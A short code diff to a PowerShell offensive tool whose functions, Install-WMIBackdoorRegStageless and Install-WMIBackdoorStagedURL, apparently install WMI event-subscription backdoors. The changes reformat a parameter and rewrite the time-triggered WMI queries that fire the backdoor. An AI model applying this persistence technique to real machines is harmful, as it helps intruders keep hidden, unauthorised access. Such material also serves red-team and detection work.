@@ -41,8 +41,7 @@ function Install-WMIBackdoorRegStageless
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True, Position=0)]
-        [string]
-        $Name,
+        [string]$Name,
 
         [Parameter(Mandatory=$False)]
         [string]
@@ -86,7 +85,7 @@ function Install-WMIBackdoorRegStageless
     {
         $Hour = $time.Split(":")[0]
         $Min = $time.Split(":")[-1] 
-        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' and ( TargetInstance.Hour = $Hour and TargetInstance.Minute = $Min and TargetInstance.Second = 0)"
+        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' and TargetInstance.Hour = $Hour and TargetInstance.Minute = $Min GROUP WITHIN 60"
     }
     else
     {
@@ -195,7 +194,7 @@ function Install-WMIBackdoorStagedURL
     {
         $Hour = $time.Split(":")[0]
         $Min = $time.Split(":")[-1] 
-        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' and ( TargetInstance.Hour = $Hour and TargetInstance.Minute = $Min)"
+        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' and TargetInstance.Hour = $Hour and TargetInstance.Minute = $Min GROUP WITHIN 60"
     }
     else
     {
